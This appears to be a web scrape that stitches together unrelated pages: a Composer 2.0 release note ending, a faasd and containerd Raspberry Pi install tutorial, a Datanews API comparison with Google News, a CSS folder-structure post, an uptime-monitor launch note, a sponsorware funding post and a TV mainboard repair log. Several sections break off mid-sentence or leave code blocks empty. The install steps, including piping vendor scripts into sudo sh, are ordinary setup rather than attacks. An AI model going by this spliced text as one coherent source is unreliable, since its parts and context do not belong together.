but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>

            <div><p>Kick the tires with faasd today, for a lightweight serverless experience that doesn't require Kubernetes. Instead it uses containerd and the existing OpenFaaS ecosystem.</p>
<blockquote>
<p>Last updated: 24th October 2020 - upgraded faasd &amp; containerd versions. Added instructions for core components logs such as the gateway.</p>
</blockquote>
<p>You can run <a href="https://github.com/openfaas/faasd">faasd</a> anywhere, even on a <a href="https://www.raspberrypi.org/">Raspberry Pi</a>, but why would you want to do that? faasd offers many of the benefits of containers and <a href="https://github.com/openfaas/faas">OpenFaaS</a>, but without the complexity and operational costs of Kubernetes. <a href="https://github.com/containerd/containerd">containerd</a> is a low-level tool for automating containers, and a <a href="https://landscape.cncf.io/">CNCF project</a>.</p>
<p><img src="https://blog.alexellis.io/content/images/2019/12/ofctr.png" alt="OpenFaaS and containerd logos"></p>
<p>The use-cases for <a href="https://blog.alexellis.io/introducing-functions-as-a-service/">Serverless / FaaS are fairly well-known</a>, but you could use faasd at the edge, in a smart-car, as part of an IoT device, for crunching data before uploading samples to the cloud, for webhook receivers/alerting, bots, webservices, API integrations or even providing your own APIs. Compute is compute, and OpenFaaS with containerd makes it easy to both consume and provide.</p>
<blockquote>
<p>🚀 Support the development of faasd - <a href="https://github.com/sponsors/openfaas">Sponsor OpenFaaS on GitHub</a><br>
⭐️ Star or fork <a href="https://github.com/openfaas/faasd">faasd on GitHub</a></p>
</blockquote>
<h2 id="beforewestart">Before we start</h2>
<p>Use Raspbian Lite (now called RaspiOS) for this tutorial. Do not install Docker on the same Raspberry Pi as it may cause conflicts with networking and the version of containerd we are using.</p>
<p>You should use RPi 2, 3 or 4. If you have only one Raspberry Pi, then you'll be able to deploy pre-built images from the OpenFaaS Function Store, but if you have a second Raspberry Pi, then you can use it to build new functions too.</p>
<p>You can also deploy to a PC or cloud VM:</p>
<ul>
<li><a href="https://www.openfaas.com/blog/faasd-tls-terraform/">Deploy faasd to DigitalOcean with Terraform</a></li>
<li><a href="https://github.com/openfaas/faasd/blob/master/docs/MULTIPASS.md">Deploy faasd to your laptop with Multipass</a></li>
</ul>
<h2 id="installation">Installation</h2>
<p>Installation only takes a few moments, and in the future should be quicker if we can secure binaries for containerd from the upstream project.</p>
<h3 id="getfaascli">Get <code>faas-cli</code></h3>
<p>The <a href="https://github.com/openfaas/faas-cli/">faas-cli</a> can be used to build, deploy, manage, and invoke functions with OpenFaaS. OpenFaaS offers a REST API, asynchronous invocations, authentication, metrics, and a UI out of the box.</p>
<p>Install using the utility script, or alternatively the binaries are also available on the <a href="https://github.com/openfaas/faas-cli/releases">releases page</a>.</p>
<pre><code># Install to local directory
curl -sLfS https://cli.openfaas.com | sh
sudo mv faas-cli to /usr/local/bin

# Or run with sudo to move to /usr/local/bin in one step
curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<p>See also: <a href="https://docs.openfaas.com/">OpenFaaS docs</a></p>
<h3 id="getcontainerd">Get containerd</h3>
<p>Unfortunately the <a href="https://github.com/containerd/containerd">containerd</a> maintainers only provide binaries for <code>x86_64</code> (regular PCs), so we have to install Go and build containerd from source.</p>
<p>We'll install some dependencies that will help us in the tutorial and after installation</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    runc \
    bridge-utils \
    tmux \
    git
</code></pre>
<p>Pick option A or B.</p>
<h4 id="ausemycontainerdarmhfbinariesfast">A) Use my containerd armhf binaries (fast)</h4>
<p>I have compiled binaries for containerd, which you can use if you wish. <a href="https://github.com/alexellis/containerd-armhf/releases">alexellis/containerd/armhf</a>.</p>
<pre><code>curl -sSL https://github.com/alexellis/containerd-arm/releases/download/v1.3.5/containerd-1.3.5-linux-armhf.tar.gz | sudo tar -xvz --strip-components=1 -C /usr/local/bin/
</code></pre>
<h4 id="bbuildyourowncontainerdbinariesslow">B) Build your own containerd binaries (slow)</h4>
<p>Raspbian needs a few additional build-time dependencies for containerd:</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    build-essential \
    libbtrfs-dev \
    libseccomp-dev
</code></pre>
<p>You can use my utility script to build containerd now:</p>
<pre><code>export GOPATH=$HOME/go/

./hack/build-containerd-armhf.sh
</code></pre>
<p>This could take a few moments on RPi2 or 3, and is a little quicker on RPi4.</p>
<h3 id="configurecontainerdtostartonboot">Configure containerd to start on boot</h3>
<p>Install a systemd unit file for <code>containerd</code>:</p>
<pre><code>curl -SLfs https://raw.githubusercontent.com/containerd/containerd/v1.3.5/containerd.service | sudo tee /etc/systemd/system/containerd.service

sudo systemctl enable containerd
sudo systemctl start containerd
</code></pre>
<p>Check that <code>containerd</code> started with <code>sudo systemctl status containerd</code>, if not then you may need to <code>unmask</code> it and run the commands again. See <a href="https://blog.ruanbekker.com/blog/2017/12/09/unmask-a-masked-service-in-systemd/">unmasking a service</a>.</p>
<h3 id="installnetworking">Install networking</h3>
<ul>
<li>
<p>Enable the Kernel's bridge module</p>
<pre><code># One-off
sudo modprobe br_netfilter &amp;&amp; \
sudo sysctl net.bridge.bridge-nf-call-iptables=1

# Make it permanent
echo "br_netfilter" | sudo tee -a /etc/modules-load.d/modules.conf

echo "net.bridge.bridge-nf-call-iptables=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
</li>
<li>
<p>Install CNI plugins</p>
<p>Fortunately there are upstream ARM binaries available for the CNI plugins.</p>
<pre><code>sudo mkdir -p /opt/cni/bin

curl -sSL https://github.com/containernetworking/plugins/releases/download/v0.8.5/cni-plugins-linux-arm-v0.8.5.tgz | sudo tar -xz -C /opt/cni/bin
</code></pre>
</li>
<li>
<p>Enable NAT</p>
<p>Enable NAT between the container network and your wider network and the Internet:</p>
<pre><code>sudo /sbin/sysctl -w net.ipv4.conf.all.forwarding=1

echo "net.ipv4.conf.all.forwarding=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
<p>Optional step - if you have Docker running on your system, then disable it and reboot at this point.</p>
<pre><code>sudo systemctl disable docker
sudo systemctl disable docker.sock # or docker.socket - You may also need this step
</code></pre>
<p>Docker's IP address range conflicts with the one chosen by netns, this will be resolved when moving to CNI.</p>
</li>
</ul>
<h3 id="getfaasd">Get <code>faasd</code></h3>
<p>faasd is a Go binary that runs on your system and packages all of OpenFaaS, it's a similar tool to docker-compose.</p>
<p>One of faasd's commands <code>faasd provider</code> runs an OpenFaaS provider which implements the OpenFaaS "CRUD" API for functions.</p>
<p>Clean-up old versions, if required:</p>
<pre><code># Stop systemd services, if you have them
sudo systemctl stop faasd
sudo systemctl stop faasd-provider

# Remove old binaries if you have them
sudo rm -rf /usr/local/bin/faasd
</code></pre>
<p>Download the faasd binary:</p>
<pre><code>sudo curl -sSLf "https://github.com/openfaas/faasd/releases/download/0.9.5/faasd-armhf" \
    --output "/usr/local/bin/faasd" \
    &amp;&amp; sudo chmod a+x "/usr/local/bin/faasd"
</code></pre>
<p>Now run the installation:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir -p $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas

git clone https://github.com/openfaas/faasd --depth=1

cd faasd

sudo faasd install
</code></pre>
<h2 id="postinstall">Post-install</h2>
<p>The <code>faasd install</code> command creates two systemd unit files which can be used to start/stop <code>faasd</code> and <code>faasd-provider</code>.</p>
<h3 id="checktheinstallation">Check the installation</h3>
<p>Check the services:</p>
<pre><code>sudo systemctl status faasd
sudo systemctl status faasd-provider
</code></pre>
<p>Find logs:</p>
<pre><code>sudo journalctl -u faasd --lines 40
sudo journalctl -u faasd-provider --lines 40
</code></pre>
<p>You'll find your login details for the gateway in <code>/var/lib/faasd/secrets</code>, the user is <code>admin</code> and the password is in <code>/var/lib/faasd/secrets/basic-auth-password</code></p>
<h3 id="checkthelogsfromtheopenfaascoreservices">Check the logs from the OpenFaaS Core Services</h3>
<p>You can access the logs from any of the core services deployed with faasd as follows:</p>
<pre><code>sudo journalctl -t default:gateway --lines 40
sudo journalctl -t default:nats --lines 40
sudo journalctl -t default:queue-worker --lines 40
sudo journalctl -t default:prometheus --lines 40
</code></pre>
<p>For more, see the <code>docker-compose.yaml</code> file in the current directory.</p>
<h3 id="accessopenfaasfromyourlaptop">Access OpenFaaS from your laptop</h3>
<p>faasd deploys OpenFaaS along with its core logic <code>faasd-provider</code>, which uses containerd instead of Kubernetes to start, stop, and manage functions.</p>
<p>The <code>faasd</code> process will proxy any incoming requests on HTTP port 8080 to the OpenFaaS gateway container, you can also find the IP of the container in your <code>hosts</code> file in the <code>faasd</code> directory.</p>
<p>You can also access the built-in Prometheus container by editing <code>docker-compose.yaml</code> to expose its ports, either to 127.0.0.1, or all your network adapters.</p>
<h3 id="deployafunctionfromthestore">Deploy a function from the store</h3>
<p>Obtain your OpenFaaS password. You need to run this command on your Raspberry Pi:</p>
<pre><code>sudo cat /var/lib/faasd/secrets/basic-auth-password
</code></pre>
<p>Log in to the gateway, either on your RPi, or from your own computer.</p>
<pre><code># If connecting remotely
export IP=192.168.0.101
export OPENFAAS_URL=http://$IP:8080
echo $PASSWORD | faas-cli login

# Or on device:

sudo cat /var/lib/faasd/secrets/basic-auth-password | faas-cli login --password-stdin
</code></pre>
<p>Look at what's available in the function store for the armhf platform, then deploy something:</p>
<pre><code>faas-cli store list --platform armhf

# Deploy figlet
faas-cli store deploy --platform armhf figlet

# Find the URLs for the function
faas-cli store inspect figlet

# Create some ASCII

echo "faasd" | faas-cli invoke figlet
</code></pre>
<p>Try a function that can generate an <code>identicon</code> like you may have seen for default avatar logos on GitHub.com</p>
<pre><code>faas-cli store deploy --platform armhf identicon

echo $USER | faas-cli invoke identicon &gt; avatar.png
</code></pre>
<p>Here's an example of the avatar for the user <code>pi</code>:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/avatar.png" alt="avatar"></p>
<h3 id="runanasyncfunction">Run an async function</h3>
<p>You can also run your functions in the background or asynchronously.</p>
<p>Create a webhook receiver using a public service such as:</p>
<ul>
<li><a href="https://requestbin.com/">https://requestbin.com/</a></li>
<li><a href="https://postb.in/">https://postb.in/</a></li>
</ul>
<pre><code>faas-cli store deploy --platform armhf nodeinfo

curl -d "verbose" \
  http://127.0.0.1:8080/async-function/nodeinfo \
  --header "X-Callback-Url: https://postb.in/1578562711776-8760500776115"
</code></pre>
<p>You'll be able to refresh your webhook receiver and see the value.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/Screenshot-2020-01-09-at-09.41.11.png" alt="Screenshot-2020-01-09-at-09.41.11"></p>
<h3 id="buildanewcontainerimage">Build a new container image</h3>
<p>You'll need a second Raspberry Pi for this step since we do not have <code>docker</code> installed on the device.</p>
<p>There are a couple of workarounds if you don't have a second device: use buildkit per as my post <a href="https://blog.alexellis.io/building-containers-without-docker/">Building containers without Docker</a>. Or build on your PC using <a href="https://github.com/alexellis/multiarch-templates">one of my multi-arch templates</a>.</p>
<p>You can also use one of my prebuilt functions such as <a href="https://github.com/alexellis/2020/">ascii-2020</a>, but you should only run the <code>faas-cli deploy</code> step.</p>
<ul>
<li>
<p>Log into the Raspberry Pi with <code>ssh</code> and install the <code>faas-cli</code> and <code>docker</code>.</p>
<pre><code>curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<pre><code>curl -sLfS https://get.docker.com | sudo sh

sudo usermod -aG docker pi
newgrp
</code></pre>
</li>
<li>
<p>Log into the Docker Hub</p>
<pre><code>docker login
</code></pre>
</li>
<li>
<p>Create a Golang function</p>
<pre><code>export DOCKER_HUB_NAME="alexellis2"

faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  hello-world \
  --prefix $DOCKER_HUB_NAME
</code></pre>
</li>
<li>
<p>Now build and push the image</p>
<pre><code>faas-cli push -f hello-world.yml
faas-cli deploy -f hello-world.yml
</code></pre>
</li>
</ul>
<h3 id="deployyournewcontainer">Deploy your new container</h3>

              For the most basic use cases <a href="https://news.google.com/">Google News</a> or <a href="https://www.google.com/alerts">Google Alerts</a> may be enough, but both of these services have many limitations that prevent them from being used on a bigger scale.
            </p>
            <p>
              Unfortunately Google News does not provide a convenient way to retrieve a big amount of relevant data, as it poses a strict limit on the number of articles that could be retrieved per query. Yet another concern is rate limiting restrictions. Google News is primarily focused on human users, not robots, therefore you risk getting your ip banned when trying to make a large amount of queries programmatically.
            </p>
            <p>
              The search interface is also far from perfect, as it does not allow building complex queries, in contrast to
              <a href="https://www.elastic.co/what-is/elasticsearch">modern full-text search storage solutions</a>, which provide a wide variety of operators for building search queries of almost any complexity.

            <p>
              Let’s go over the main features and make a side-by-side comparison with Google News.
            </p>

            <ul>
              <li>

                <!-- Text -->
                <h3>
                  Maximum number of articles returned per query.
                </h3>

                <ul>
                  <li>
                    Google News has a max limit of <span>100</span> articles per query without any possibility to retrieve more. This may be a big limitation if the search keyword is very popular and may contain thousands or even tens of thousands of relevant articles.
                  </li>
                  <li>
                    In contrast, Datanews News API provides access to <span>all of the relevant articles whenever they were published</span>. The API uses
                    <a href="https://en.wikipedia.org/wiki/Pagination">pagination</a> for efficient transfer of a large amount of articles through the network.
                  </li>
                </ul>
              </li>

              <li>

                <!-- Text -->
                <h3>
                  Available news article metadata.
                </h3>

                <ul>
                  <li>
                    Google News provides a limited amount of metadata about each particular article. It usually includes the publication date, description field, title and the original article link.
                  </li>
                  <li>
                    Datanews API returns more additional information about each article, which is directly extracted from webpage: original article link, title, description, publication date, domain of the publication, url of the image on the article page, <span>list of authors</span>, language, country, <span>snippet of the content</span>.
                  </li>
                </ul>

                <p>Above information is much more useful for use cases such as data collection or public relations. Analyzing authors of the articles on the large scale allows PR firms to work more efficiently, as they will have more context about authors and journalists.</p>

                  <li>
                    Google News has many <a href="https://github.com/DatanewsOrg/google-news-js">unofficial implementations of client libraries</a> for accessing it’s content. Although, none of them really goes past limitations mentioned above.</li>
                  <li>
                    As for the <a href="https://datanews.io/">Datanews</a>, we have developed special client libraries for several main programming languages to make it super simple to integrate News API into your solution. You can start using and testing the API in just several lines of code. See

              Choosing between <a href="https://news.google.com/">Google News</a> and other News API is really about your use case. If you need something simple just for personal use, then going with Google News or Google Alerts will make perfect sense.
            </p>
            <p>
              Otherwise, if you plan to build some software system with bigger scale, then going with an existing news API provider like <a href="https://datanews.io/">Datanews</a> will make more sense. It will provide you with a reliable and complete news monitoring solution that is ready to be integrated into your product.

	    	    				    		      	    	<p>When it comes to structuring CSS, there is no shortage of different naming conventions, methodologies, and architectures. Be it <a href="http://getbem.com/">BEM</a>, <a href="https://github.com/stubbornella/oocss/wiki">OOCSS</a>, <a href="http://smacss.com/">SMACSS</a>, <a href="https://www.creativebloq.com/web-design/manage-large-css-projects-itcss-101517528">ITCSS</a>, or <a href="https://piccalil.li/cube-css/">CUBE CSS</a> – over the last years, many different approaches to managing modular CSS have emerged. Some are offering strategies on how to split CSS into smaller, more manageable pieces, while others focus more on naming conventions for classes. Sometimes, it can be hard to grasp where the differences or advantages of certain methodologies lie, yet in the end, they all aim at the same: Providing structure and consistency, also known as “avoiding a mess”, when you are working in a team or with your present and future self.</p>

<p>No wonder there isn’t a new project where I don’t start to think about the structure of my CSS a bit and, over time, the way I organize and write CSS has changed a lot. The biggest change came when we all started to write CSS for components. But also preprocessors like Sass have clearly left their mark.</p>

<p>In this post, I will share my current take on CSS structure. It does not religiously follow any particular methodology, although people familiar with <a href="https://www.creativebloq.com/web-design/manage-large-css-projects-itcss-101517528">Harry Roberts’ ITCSS</a> (“Inverted Triangle CSS”) will definitely recognize parts of his methodology. If you haven’t yet looked at ITCSS, I highly recommend it. What I like most, is the pragmatic, real-life approach and the principle of structuring your CSS in a way that gets ever more specific and explicit the farther down you go in the structure. This allows you to focus on the high-level styles first and makes it easier to deal with the cascade, inheritance, and selector specificity while keeping the number of classes – and the specificity! – as low as possible. There are, however, a few differences, and this is also what I’d suggest to anyone setting up their own structure: Take any methodology with a grain of salt and freely adjust it to your needs and the way you work.</p>

<h2>The Folder Structure</h2>

<p>This is how my folder structure currently looks like:</p>

														
	    	    							    	<pre><code>
/scss/
├── 1-settings
├── 2-design-tokens
├── 3-tools
├── 4-generic
├── 5-elements
├── 6-skeleton
├── 7-components
├── 8-utilities
├── _shame.scss
└── main.scss
</code>
</pre>
											
	    	    				    		      	    	<p>Let’s break it down a bit.</p>

<h3>Settings</h3>

<p>The first folder, <code>1-settings</code>, is for all general project settings, so for the most basic high-level configuration. This might be a collection of global variables – either as Sass variables or custom properties.</p>

														
	    	    							    	<pre><code>
├── 1-settings
│&nbsp;&nbsp; └── _global.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Design Tokens</h3>

<p>The second folder is for all styles regarding the visual vocabulary of the site. At this level, we are still not generating any CSS output. It is where we define variables for the typography, colors, spacing, media-queries, or any other attributes which you will use throughout the design. For these visual design attributes, the term <em>design tokens</em> has taken hold. Those design tokens could even be coming from your design system as a single source of truth.</p>

														
	    	    							    	<pre><code>
├── 2-design-tokens
│&nbsp;&nbsp; ├── _colors.scss
│&nbsp;&nbsp; ├── _fonts.scss
│&nbsp;&nbsp; ├── _media-queries.scss
│&nbsp;&nbsp; ├── _spacing.scss
│&nbsp;&nbsp; └── _typography.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Tools</h3>

<p>The tools folder is where your global Sass mixins and functions live. Maybe you want to manipulate colors with blend modes or set the aspect ratio for a video container? Or clear your float, for example. I am not a heavy user of mixins myself, but I know many people who love them, so this is where to put them.</p>

														
	    	    							    	<pre><code>
├── 3-tools
│&nbsp;&nbsp; ├── _aspect-ratio.scss
│&nbsp;&nbsp; ├── _blend-modes.scss
│&nbsp;&nbsp; ├── _center.scss
│   ├── _clearfix.scss
│&nbsp;&nbsp; └── _gradients.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Generic</h3>

<p>Just like in ITCSS, the generic folder is the first one that actually produces CSS. It contains global box-sizing rules, CSS resets, or print styles – anything that should be set right at the beginning of your CSS but isn’t yet project-specific.</p>

														
	    	    							    	<pre><code>
├── 4-generic
│&nbsp;&nbsp; ├── _box-sizing.scss
│&nbsp;&nbsp; ├── _font-face.scss
│&nbsp;&nbsp; ├── _normalize.scss
│&nbsp;&nbsp; └── _print.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Elements</h3>

<p>Now that the most basic things are set up, we can start to style the building blocks of our front-end: Raw HTML Elements. Mostly without classes, we are now redefining the basic browser styles of headlines, buttons, links, lists, etc. and can make sure that all components in our design are using the same consistent base.</p>

														
	    	    							    	<pre><code>
├── 5-elements
│&nbsp;&nbsp; ├── _forms.scss
│&nbsp;&nbsp; ├── _headings.scss
│&nbsp;&nbsp; ├── _images.scss
│&nbsp;&nbsp; ├── _links.scss
│&nbsp;&nbsp; └── _lists.scss
│&nbsp;&nbsp; ├── ...
</code>
</pre>
											
	    	    				    		      	    	<h3>Skeleton</h3>

<p>Any modern web project that is built with components also comes with the need for a higher-level structure in which all the components can live: Wrappers, containers, grids, and all kinds of reusable objects that provide layout patterns. This is the skeleton of your site.</p>

														
	    	    							    	<pre><code>

	    	    				    		      	    	<h3>Components</h3>

<p>The beating heart of the project. This is where we design the components of the UI. In a few recent projects, I sometimes distinguished between larger modules and smaller components, but you can also nest components into each other and do without the additional distinction. Use prefixes, if you like, and also <a href="https://css-tricks.com/bem-101/">a naming convention like BEM</a> can make a lot of sense. I have recently settled on a BEM-like but more simplified naming convention: Just use the simplest but most descriptive class name possible and separate elements within other elements with a simple dash, like <code>.card</code> and <code>.card-content</code>. Sometimes – for example, when I work with <a href="https://fractal.build/">Fractal</a> – the CSS for individual components might also live in another folder, together with the HTML and JavaScript code. In this case, the components folder might be empty, or contain references via <code>@import</code>.</p>

														
	    	    							    	<pre><code>
├── 7-components
│&nbsp;&nbsp; ├── _accordion.scss
│&nbsp;&nbsp; ├── _card.scss
│&nbsp;&nbsp; ├── _hero.scss
│&nbsp;&nbsp; ├── _pan-galactic-gargle-blaster.scss
│&nbsp;&nbsp; └── ...
</code>
</pre>
											
	    	    				    		      	    	<h3>Utilities</h3>

<p>Another folder? Yes, but this is definitely the last one. The utilities folder contains utility and helper classes and, most importantly, states and modifiers like <code>.is-active</code> or <code>.visually-hidden</code>. Those styles override the styles in the previous layers and are often set via JavaScript. I really like <a href="https://piccalil.li/cube-css/exception/">the suggestion by Andy Bell in his CUBE CSS methodology</a> to use data-attributes to change the state of components, which is also useful in terms of the higher specificity.</p>

														
	    	    							    	<pre><code>
├── 8-utilities
│&nbsp;&nbsp; ├── _modifiers.scss
│&nbsp;&nbsp; └── _states.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>_shame.scss</h3>

<p>This file, which is <a href="https://csswizardry.com/2013/04/shame-css/">another idea by Harry Roberts</a>, is a place for all the shameful CSS solutions like quick fixes and hacky things that might solve a problem for the time being but should be solved properly later. Make sure to document all those nasty hacks with comments, though: Why did you solve it this way? Do you already have an idea on how to solve it better? What is needed to solve it? And so on…</p>

<h3>Putting it all together</h3>

<p>Finally, the <code>main.scss</code> file is where all the individual files are combined. I prefer to explicitly import each file in a new line instead of importing whole folders because I have more control over the source order. But this is only my personal preference, of course.</p>

														
	    	    							    	<pre><code>
@charset "UTF-8";

// 1. Settings
@import 
	"1-settings/global";
  
// 2. Design Tokens
@import
  "2-design-tokens/colors",
  "2-design-tokens/fonts",
  "2-design-tokens/media-queries",
  "2-design-tokens/spacing",
  "2-design-tokens/typography";
...
</code>
</pre>
											
	    	    				    		      	    	<p>And that’s it. A structure like this has served me well in recent projects because it keeps everything tidy. The resulting CSS is also much cleaner and it is easier to find the right piece of code when you have to make changes or do bugfixes.</p>

<p>I asked on Twitter the other day which CSS methodology you all prefer and the results were, as was to be expected, mixed:</p>

														
	    	    							    	<blockquote data-dnt="true"><div lang="en" dir="ltr"><p>Web developers and designers of the interwebs! What is your favorite…</p><p>✨CSS methodology✨?</p><p>—and why?</p></div>— Matthias Ott (@m_ott) <a href="https://twitter.com/m_ott/status/1292946698717757444?ref_src=twsrc%5Etfw">August 10, 2020</a></blockquote>  
											
	    	    				    		      	    	<p>People all like to use their own flavor of CSS, which is great.  If you use a methodology or folder structure that you would like to share, write a post about it and I’ll happily link to it here. It would be interesting to see how you structure your CSS.</p>

<p>For future reference, here’s the whole folder structure again:</p>

				<p>Has it ever happened to you that your hosting crashed, and your website was down for hours without you even noticing? Never again!</p>
<p>Monitoria si an active monitoring service you can use to monitor your website or basically any HTTP(S) endpoint. It will periodically send requests to the selected URL, and when it starts receiving errors, it will send you a notification.</p>
<p>This way, you will be notified immediately when your website is down.</p>
<h2 id="overview">Overview</h2>
<p>When you create a monitor, it will be sending a monitoring request every 5 minutes. After three consecutive failures, the monitor will send a notification to your email address.</p>
<p>Besides the notification functionality, you can find a lot of useful information on the monitor overview page. Most importantly:</p>
<ul>
<li>Monitoring statistics</li>
<li>Timeline of monitoring requests and events</li>
<li>Information why monitoring request failed</li>
</ul>
<p>Check out the screenshot below showing the monitor overview and describing the monitoring timeline.</p>
<div>
    
    <p><img src="https://cdn.monitoria.ca/img/Screenshot13a.png" alt="Monitor overview screenshot">        
    </p>
</div>
<h2 id="future">Future</h2>
<p>Even that we just started, there is already plenty of features we plan to implement in the future. Before the end of this year, we will be releasing:</p>
<ul>
<li>Much faster notifications with 1-minute monitors</li>
<li>More notification options (multiple email addresses, SMS, etc.)</li>
<li>Advanced configuration options for monitors (configurable monitoring request and success checks, variable alarming and recovery intervals, etc.)</li>
</ul>
<p>Anyway, these are exciting times, and I’m looking forward to continue working on this project.</p>
<p>If you have any questions, suggestions, or just want to say hi, then send me an email at <a href="mailto:robert@monitoria.ca">robert@monitoria.ca</a>. I will be happy to hear from you.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I've learnt about Caleb Porzio's <a href="https://calebporzio.com/sponsorware">sponsorware model</a> as a way to fund an open source project. The idea is to release a new feature only to the funders and, once you got X new funders, only then the new feature becomes open source, available to everyone.</p><p>But I haven't seen much success with this strategy yet to fund <a href="https://github.com/GraphQLAPI/graphql-api-for-wp">my open source plugin</a>. The reason is clear: Sponsorware initially worked for Caleb because he asked the 10.000 subscribers on his newsletter for support, from which 75 agreed to be part of it. But I do not have 10.000 subscribers or followers or users, and building such a list takes time.</p><p>Caleb's second strategy seems much more promising: He also started selling access to <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it">tutorials on using the software</a>. He says this strategy has been incredibly successful: as I'm writing this, <a href="https://github.com/sponsors/calebporzio#sponsors">he's surpassed 1100 sponsors</a>!</p><p>The <strong>quest for learning</strong> appears to be a <strong>strong motivator to fund a project</strong>.</p><p>I've been delaying implementing this strategy, though, because it takes effort to:</p><ol><li>Build the website to check if the user is sponsoring me on GitHub, and only then grant him/her access to the private video in Vimeo</li><li>Create professional videos</li></ol><p>The day has only 24 hs, and I'm working alone on my project, so there's only so much I can do. I've so far decided to prioritize improving the plugin first, adding all the minimal basic features that I would love to have as a user, and only then start producing tutorial videos.</p><p>I've actually been lucky: just a few days ago, site <a href="https://spatie.be/">spatie.be</a> (based on Laravel) was <a href="https://github.com/spatie/spatie.be">open sourced</a>, making available the code implementing several of the required features:</p><ul><li>Validating users through GitHub login</li><li>Giving access to private Vimeo videos to paying users</li></ul><p>So building the site is now within my reach. I just need to work on creating the videos.</p><p>Hopefully I'll soon be able to comment if selling tutorial videos can succeed in funding the open source plugin.</p></div></div>]]>

They offered me a cheap dead 42-inchPhilips 42PFL7962 TV set with the diagnosis “after a thunderstorm the mine-board burned down”. An autopsy revealed that the mine in it is not at all. Without thinking twice, I decided to put in it a universal mine-card with a DVB-T2 tuner, since the original part cannot compete either in price or in functionality. During installation, there were some difficulties associated with the power supply of the TV and its large diagonal, which I will try to describe in the review. <br><span id="more-1384"></span><br>
This board is perhaps the most popular of allbecause it accepts digital TV DVB-T2, and at the same time is quite cheap. Prices for a scaler without a number start at 700 rubles and, given that analog TV in Russia will soon completely disappear, it makes sense to order them only if used as a monitor. Scaler arrived very quickly, was ordered on October 10 and already on October 22 I took the package.<br>

The carton contains: a board, a remote control, a silicone case for it, an IR receiver and a small piece of wire with a connector for connecting it to the board, as well as instructions on A4 paper.<br>

Preparing the lane for work<br>
One of the known problems of this board is strongCPU heat. Even before the first power up, it was decided to replace the “radiator”, glued to the process, with a more massive one. The small aluminum diffuser broke away from the processor almost effortlessly. Marking of the processor MSD3663LUA-Z1.<br>

Wiring LVDS cable<br>
The PHILIPS 42PFL7962D TV uses the T420HW01 V.2 panel, the resolution is 1920 * 1080, 16.7 million colors, the supply voltage is 12V, the current consumption is 1A. Pinout and other technical data are in <a target="_blank" href="http://go.redlightgreen.org/redirect/cpa/o/pn2mxkz8nz4v07lyadx410a613pugos2?to=http%3A%2F%2Farchive.espec.ws%2Fsection1063%2Ffile29799.html&amp;key=ms&amp;s=msab.62ad69c">datasheet</a> on her.<br>
This is how the plug in the T-Con of the matrix looks like:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15370.jpg"><br>
We paint the pinout of the matrix, the universal lane and correlate:<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15372.jpg"><br>
It is seen that the signal pairs of wires are made in the same color, which facilitates their search. Negative signal wires with a black stripe along. Find each pair and mark it. <br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15373.jpg"><br>
We also mark the power supply and "earth" wiring. Then we connect them with the corresponding pins on the connector. I regretted that I did not order the LVDS cable together with the card, since the TV cable has a different plug for connecting to the lane. I had to solder directly to the pins on the back of the board.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15375.jpg"><br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15377.jpg"><br>
In principle, the mine is ready for a performance check (it and the TV matrix). Install the matrix power supply jumper to 12V.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15379.jpg"><br>
We power the backlight separately from the native unitTV power, and lanes - from another small power supply unit, issuing 12 V. We connect the buttons and the IR receiver (left from another universal lane) and everything is ready.<br>
<img src="http://redlightgreen.org/wp-content/uploads/2019/1/image-15381.jpg"><br>
But before turning on our constructor, it is necessary to flash the board for the resolution of the matrix we need.<br>
Firmware</p><p>

Now that we have verified that the board is working, we need to bring the design to mind. <br>
About power supply<br>
The TV uses a power supply <a target="_blank" href="http://go.redlightgreen.org/redirect/cpa/o/pn2mxkz8nz4v07lyadx410a613pugos2?to=http%3A%2F%2Ftel-spb.ru%2Ffiles%2Fphilips_plcd300p3.rar&amp;key=ms&amp;s=msab.3703560">PLCD300P3</a> 170 W. It provides 3 supply voltages: 5.2V, 12V and 24V. And then I ran into some of the nuances. One of them is that when turned on, the power supply unit produces only one voltage of 5.2V. A 12 and 24 volts appear when the light signal turns on the BLON illumination from the lane. And, as you know, the mine is powered by 12V. It turns out that we can not power the universal board from this power supply?<br>
